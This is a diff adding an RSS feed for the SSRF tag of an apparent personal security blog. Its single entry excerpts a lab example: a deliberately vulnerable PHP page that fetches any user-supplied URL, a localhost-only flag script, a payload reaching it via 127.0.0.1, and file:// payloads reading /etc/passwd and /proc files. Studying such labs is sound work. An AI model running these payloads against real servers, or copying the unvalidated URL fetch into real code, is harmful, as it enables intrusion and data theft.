@@ -1,0 +1,19 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>SSRF on n2ryx&#39;s Blog</title>
+    <link>https://n2ryx.github.io/tags/ssrf/</link>
+    <description>Recent content in SSRF on n2ryx&#39;s Blog</description>
+    <generator>Hugo</generator>
+    <language>en</language>
+    <lastBuildDate>Mon, 29 Jan 2024 00:00:00 +0000</lastBuildDate>
+    <atom:link href="https://n2ryx.github.io/tags/ssrf/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SSRF</title>
+      <link>https://n2ryx.github.io/docs/ssrf/ssrf/</link>
+      <pubDate>Mon, 29 Jan 2024 00:00:00 +0000</pubDate>
+      <guid>https://n2ryx.github.io/docs/ssrf/ssrf/</guid>
+      <description>SSRF example&#xA;# index.php &amp;lt;?php highlight_file(__FILE__); function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo $result; } $url = $_GET[&amp;#39;url&amp;#39;]; curl($url); # ssrf.php &amp;lt;?php $ip = $_SERVER[&amp;#34;REMOTE_ADDR&amp;#34;]; if($ip === &amp;#34;127.0.0.1&amp;#34;){ if($_GET[&amp;#34;passwd&amp;#34;] === &amp;#34;adminTrue&amp;#34;){ readfile(&amp;#34;/flag&amp;#34;); } else{ echo &amp;#34;no&amp;#34;; } }else{ echo &amp;#34;not 127.0.0.1&amp;#34;; } payload&#xA;?url=http://127.0.0.1/ssrf.php?passwd=adminTrue&#xD;... 利用协议 file://&#xD;dict://&#xD;gopher://&#xD;ftp://&#xD;sftp://&#xD;ldap://&#xD;tftp://&#xD;... file://&#xA;file://&#xD;file:///etc/passwd&#xD;file:///etc/hosts&#xD;file:///proc/net/arp&#xD;file:///proc/net/fib_trie&#xD;.</description>
+    </item>
+  </channel>
+</rss>
